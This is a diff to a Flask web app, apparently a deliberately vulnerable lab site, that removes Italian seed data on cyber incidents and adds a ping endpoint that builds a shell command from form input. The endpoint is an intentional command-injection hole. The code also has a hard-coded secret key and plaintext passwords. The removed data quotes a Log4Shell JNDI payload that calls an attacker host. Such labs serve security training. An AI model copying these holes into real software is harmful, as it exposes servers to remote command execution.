@@ -1,7 +1,7 @@
 from flask import Flask, render_template, request, redirect, url_for, session, abort
 from flask_sqlalchemy import SQLAlchemy
 from sqlalchemy import text
-
+import subprocess
 
 app = Flask(__name__)
 app.secret_key = 'SECRETKEY123'
@@ -42,86 +42,6 @@ class Report(db.Model):
 
 with app.app_context():
     db.create_all()
-
-    if Report.query.count() == 0:
-        reports = [
-            Report(
-                title="WannaCry Ransomware Attack",
-                cve_id="CVE-2017-0144 (EternalBlue)",
-                date="Maggio 2017",
-                impact="300.000+ computer infetti in 150 paesi. Danni stimati tra 4 e 8 miliardi di dollari. Colpiti ospedali UK, Telefonica, FedEx, Renault.",
-                description="WannaCry è un ransomware che ha sfruttato la vulnerabilità EternalBlue nei sistemi Windows. Ha crittografato i file e richiesto un riscatto in Bitcoin (300-600$).",
-                technical_details="La vulnerabilità risiede nel protocollo SMBv1 (Server Message Block). L'attaccante invia un pacchetto craftato che causa un buffer overflow, permettendo l'esecuzione di codice remoto. Microsoft aveva rilasciato una patch a marzo 2017, ma molti sistemi (inclusi ospedali UK) non l'avevano installata. Un kill switch (dominio trovato per caso) ha fermato la propagazione.",
-                affected_systems="Windows XP, Windows 7, Windows Server 2008 R2, Windows 8.1, Windows Server 2012. Non colpisce Windows 10.",
-                solution="Applicare la patch MS17-010. Disabilitare SMBv1. Mantenere backup offline. Aggiornare sistemi legacy.",
-                source="https://www.cisa.gov/known-exploited-vulnerabilities",
-                image_url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/03/WannaCry_screenshot.png/300px-WannaCry_screenshot.png"
-            ),
-            Report(
-                title="Attacco all'Infrastruttura Vaccini Regione Lazio",
-                cve_id="Attacco Ransomware (LockBit)",
-                date="1 Agosto 2021",
-                impact="Blocco del portale prenotazioni vaccini per 3 giorni. 2 ore di blackout completo. Dati sensibili di cittadini esposti. Richiesta riscatto: 5 milioni di euro.",
-                description="Un attacco ransomware ha colpito il data center della Regione Lazio che gestiva le prenotazioni dei vaccini anti-COVID durante la campagna vaccinale di massa.",
-                technical_details="L'attacco ha sfruttato vulnerabilità in sistemi VPN Pulse Secure (CVE-2019-11510, CVE-2020-8243) non aggiornati. I criminali hanno utilizzato un ransomware della famiglia LockBit, cifrando 49 server. L'attacco è iniziato alle 5:00 del mattino per massimizzare l'impatto. La Regione ha dichiarato di non aver pagato il riscatto, ripristinando da backup.",
-                affected_systems="Server Windows, sistemi di prenotazione CED, VPN Pulse Secure, database sanitari.",
-                solution="Aggiornamento di tutti i sistemi VPN (patch disponibili da mesi). Implementazione MFA obbligatoria. Segmentazione di rete. Backup offline quotidiani.",
-                source="https://www.cybersecurity360.it/nuove-minacce/attacco-ransomware-regione-lazio/",
-                image_url="https://www.regione.lazio.it/sites/default/files/styles/medium/public/news/2021-08/COMUNICATO%20LAZIOcrea_3.png"
-            ),
-            Report(
-                title="Log4Shell (Apache Log4j RCE)",
-                cve_id="CVE-2021-44228",
-                date="9 Dicembre 2021",
-                impact="CVSS 10.0 (massimo). Milioni di applicazioni Java vulnerabili. Colpiti: Apple, Amazon, Cloudflare, Minecraft, VMware, ElasticSearch, Apache Struts.",
-                description="Vulnerabilità critica in Log4j 2 (libreria di logging più usata in Java). Un attaccante può eseguire codice remoto semplicemente facendo loggare una stringa malevola.",
-                technical_details="Log4j esegue lookup JNDI (Java Naming and Directory Interface) sulle stringhe loggate. Inviando `${jndi:ldap://attacker.com/exploit}` si costringe il server a scaricare ed eseguire codice Java malevolo da un server LDAP controllato dall'attaccante. Sfruttabile via User-Agent, parametri HTTP, headers, campi form, JSON, XML. Esistono bypass (CVE-2021-45046, CVE-2021-45105, CVE-2021-44832).",
-                affected_systems="Log4j 2.0-beta9 fino a 2.14.1. Tutti i sistemi Java che usano Log4j con JNDI lookup abilitato (default).",
-                solution="Aggiornare a Log4j 2.15.0 (poi 2.16.0, 2.17.0, 2.17.1). Disabilitare JNDI lookup con `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` o rimuovere la classe JndiLookup dal classpath.",
-                source="https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
-                image_url="https://www.lunasec.io/docs/img/log4shell-logo.png"
-            ),
-            Report(
-                title="Heartbleed (OpenSSL)",
-                cve_id="CVE-2014-0160",
-                date="7 Aprile 2014",
-                impact="66% dei server web vulnerabili (circa 500.000). Esposte chiavi private (SSL/TLS), password, sessioni, dati sensibili di utenti.",
-                description="Bug critico nell'implementazione del heartbeat TLS/DTLS di OpenSSL. Permette di leggere 64KB di memoria del server oltre il buffer consentito.",
-                technical_details="La funzione `tls1_process_heartbeat` non verificava che la richiesta di heartbeat corrispondesse alla dimensione effettiva del payload. Un attaccante poteva inviare una richiesta con payload fittizio di 1 byte ma dichiarare una lunghezza di 65536, ricevendo indietro 64KB di memoria adiacente al buffer. Nessun log dell'attacco. Sfruttabile passivamente.",
-                affected_systems="OpenSSL 1.0.1 fino a 1.0.1f. Non colpite versioni 1.0.0, 0.9.8, 1.1.0.",
-                solution="Aggiornare OpenSSL a 1.0.1g. Revocare e rigenerare tutti i certificati SSL/TLS. Cambiare tutte le password degli utenti.",
-                source="https://heartbleed.com/",
-                image_url="https://heartbleed.com/heartbleed.png"
-            ),
-            Report(
-                title="SolarWinds Supply Chain Attack",
-                cve_id="CVE-2020-10148, SUNBURST backdoor",
-                date="Dicembre 2020 (scoperto)",
-                impact="18.000 clienti SolarWinds compromessi. Agenzie USA colpite: DHS, Treasury, Commerce, Energy, State Department. Attacco attribuito a APT29 (Cozy Bear - Russia).",
-                description="Attacco alla supply chain: backdoor iniettata nell'update legittimo di SolarWinds Orion. Gli aggressori hanno firmato il malware con certificato digitale rubato di SolarWinds.",
-                technical_details="Il malware SUNBURST rimaneva dormiente per 12-14 giorni dopo l'installazione, poi contattava C2. Permetteva esecuzione comandi, exfiltration dati, movimento laterale. L'attacco ha richiesto mesi di pianificazione. Gli aggressori hanno prima compromesso l'ambiente di build di SolarWinds.",
-                affected_systems="SolarWinds Orion Platform versioni 2019.4 HF5, 2020.2.1 HF1, 2020.2.1, 2019.4, 2019.2, 2018.4, 2018.2, 2017.2.",
-                solution="Aggiornare SolarWinds Orion a versione 2020.2.1 HF2. Isolare sistemi compromessi. Audit completo del traffico di rete. Implementare Zero Trust.",
-                source="https://www.cisa.gov/solarwinds",
-                image_url="https://www.cisa.gov/sites/default/files/styles/image_card_800x450/public/2022-03/solarwindsimage.jpg"
-            ),
-            Report(
-                title="Attacco Ransomware ASL Napoli 1",
-                cve_id="Attacco Ransomware (CryptoLocker)",
-                date="Febbraio 2021",
-                impact="Blocco di 4 ospedali della ASL Napoli 1 Centro. Operazioni di triage e pronto soccorso rallentate. Esami diagnostici bloccati.",
-                description="Attacco ransomware ha colpito l'infrastruttura informatica della ASL Napoli 1, interrompendo i servizi sanitari durante la pandemia COVID.",
-                technical_details="Accesso via RDP esposto su internet senza MFA. Utilizzo di credenziali deboli. Diffusione tramite GPO (Group Policy Objects). Cifratura di file server e postazioni di lavoro.",
-                affected_systems="Server Windows, postazioni cliniche, sistemi di refertazione.",
-                solution="Disabilitare RDP esposto. Implementare MFA. Backup 3-2-1 (3 copie, 2 supporti diversi, 1 offline). Segmentazione di rete tra reparti.",
-                source="https://www.cybersecitalia.it/ransomware-asl-napoli/",
-                image_url=""
-            )
-        ]
-        for r in reports:
-            db.session.add(r)
-        db.session.commit()
-
     if User.query.count() == 0:
         users = [
             User(username="admin", password="admin123", email="admin@nestyk.it", credit_card="4111-1111-1111-1111",
@@ -253,6 +173,7 @@ def dashboard():
     return render_template('acc/dashboard.html')
 
 
+
 @app.route('/profile/<int:user_id>')
 def profile(user_id):
     if 'user_id' not in session:
@@ -301,16 +222,28 @@ def files():
         return render_template('acc/files.html', error="File non trovato", filename=filename)
 
 
-@app.route('/reports')
-def reports_index():
-    all_reports = Report.query.order_by(Report.id).all()
-    return render_template('reports/index.html', reports=all_reports)
+
+@app.route('/ping')
+def ping():
+    return render_template('acc/ping.html')
 
 
-@app.route('/reports/<int:report_id>')
-def report_detail(report_id):
-    report = Report.query.get_or_404(report_id)
-    return render_template('reports/detail.html', report=report)
+@app.route('/do_ping', methods=['POST'])
+def do_ping():
+
+    ip = request.form.get('ip', '')
+
+    command = f"ping -c 4 {ip}"
+
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
+        output = result.stdout + result.stderr
+    except subprocess.TimeoutExpired:
+        output = "Comando timeout (10 secondi)"
+    except Exception as e:
+        output = f"Errore: {e}"
+
+    return render_template('acc/ping.html', ip=ip, output=output)
 
 
 @app.route('/logout')
